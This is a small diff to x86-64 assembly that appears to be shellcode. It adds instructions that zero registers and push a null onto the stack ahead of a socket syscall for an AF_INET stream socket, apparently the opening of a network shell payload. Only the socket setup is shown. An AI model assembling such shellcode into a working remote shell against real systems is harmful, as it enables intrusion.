@@ -19,7 +19,9 @@ _start:
 	; SOCK_STREAM = 1
 	; syscall number 41
 
-
+        xor rsi , rsi
+        mul rsi           ; null rdx , rax
+        push rax          ; ensure the stack contains null
 	push byte 0x29      ; syscall 41
 	pop rax
 	push byte 0x2       ; AF_INET
